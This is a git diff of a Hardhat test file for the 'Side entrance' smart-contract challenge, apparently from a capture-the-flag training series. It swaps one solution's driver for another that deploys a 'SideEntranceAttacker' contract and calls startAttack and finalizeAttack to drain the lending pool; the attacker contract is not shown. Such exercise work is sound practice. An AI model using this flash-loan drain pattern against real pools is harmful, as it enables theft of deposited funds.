@@ -4,7 +4,7 @@ const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
 
 describe("[Challenge] Side entrance", function () {
   let deployer, player;
-  let pool, playerContract;
+  let pool;
 
   const ETHER_IN_POOL = 1000n * 10n ** 18n;
   const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;
@@ -21,22 +21,13 @@ describe("[Challenge] Side entrance", function () {
     // Player starts with limited ETH in balance
     await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
     expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);
-
-    playerContract = await (
-      await ethers.getContractFactory("SideEntranceLenderPoolReciever", deployer)
-    ).deploy(player.address, pool.address);
   });
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
+    let attacker = await (await ethers.getContractFactory("SideEntranceAttacker", player)).deploy(pool.address);
 
-    /*
-        This is only a part of the solution, to see the smart contract code, go to the contracts folder.
-        The name of the solution file is "SideEntranceLenderPoolReciever.sol".
-    */
-
-    await playerContract.getFlashLoan(ETHER_IN_POOL);
-    await playerContract.connect(player).sendBalance();
+    await attacker.startAttack().then(async () => await attacker.finalizeAttack());
   });
 
   after(async function () {
